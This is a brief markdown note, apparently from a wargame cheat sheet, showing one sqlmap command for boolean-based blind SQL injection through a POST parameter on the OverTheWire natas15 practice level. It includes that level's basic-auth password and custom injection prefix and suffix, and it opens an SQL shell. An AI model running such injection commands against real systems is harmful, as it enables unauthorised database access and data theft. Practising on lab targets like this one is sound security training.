## sqlmap

Blind SQL injection example with POST

    $ python2 sqlmap.py -v3 \
             -u 'http://natas15.natas.labs.overthewire.org/index.php' \
             --auth-type=basic --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" \
             --proxy="http://127.0.0.1:8080" \
             --data "username=" -p "username" \
             --level 4 --risk 3 --string "exists" \
             --technique B --prefix '" ' --suffix ' AND ""="' \
             --sql-shell
